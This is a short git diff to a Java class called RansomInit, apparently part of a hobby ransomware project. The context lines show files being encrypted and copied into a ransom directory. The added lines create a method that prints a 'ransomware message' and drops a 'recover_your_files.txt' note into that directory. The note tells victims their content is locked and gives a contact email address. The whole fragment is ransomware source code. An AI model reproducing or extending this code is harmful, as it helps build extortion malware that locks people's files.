@@ -32,11 +32,18 @@ public class RansomInit {
 			byte[] content = enc.encrypt(file);
 			copyProcess(ransomDir, getName(file), content);
 			System.out.println("Verify content: " + enc.decrypt(content));
-
+			message(ransomDir);
 		}
 
 	}
 
+	
+	private static void message(String dir) {
+		System.out.println("F0ns1-ransomware message: ");
+		String message="Your content is locked: contante with fonso.gonzalezsan@gmail.com";
+		copyProcess(dir, "recover_your_files.txt", message.getBytes());
+		
+	}
 	private static void copyProcess(String ransomDir, String name, byte[] content) {
 		File create = new File(ransomDir);
 		try {
